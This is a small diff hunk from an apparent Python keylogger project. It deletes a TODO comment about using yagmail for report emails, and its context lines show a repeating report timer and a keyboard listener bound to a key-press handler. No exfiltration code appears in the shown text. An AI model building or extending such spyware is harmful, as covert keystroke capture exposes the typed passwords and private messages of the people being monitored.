@@ -37,8 +37,6 @@ class Keylogger:
         timer = threading.Timer(self.interval, self.report)
         timer.start()
 
-    # TODO: consider using yagmail, adding topic and better formatting.
-
     def start(self):
         print("[+] Keylogger has been started.")
         keyboard_listener = pynkey.Listener(on_press=self.process_key_press)
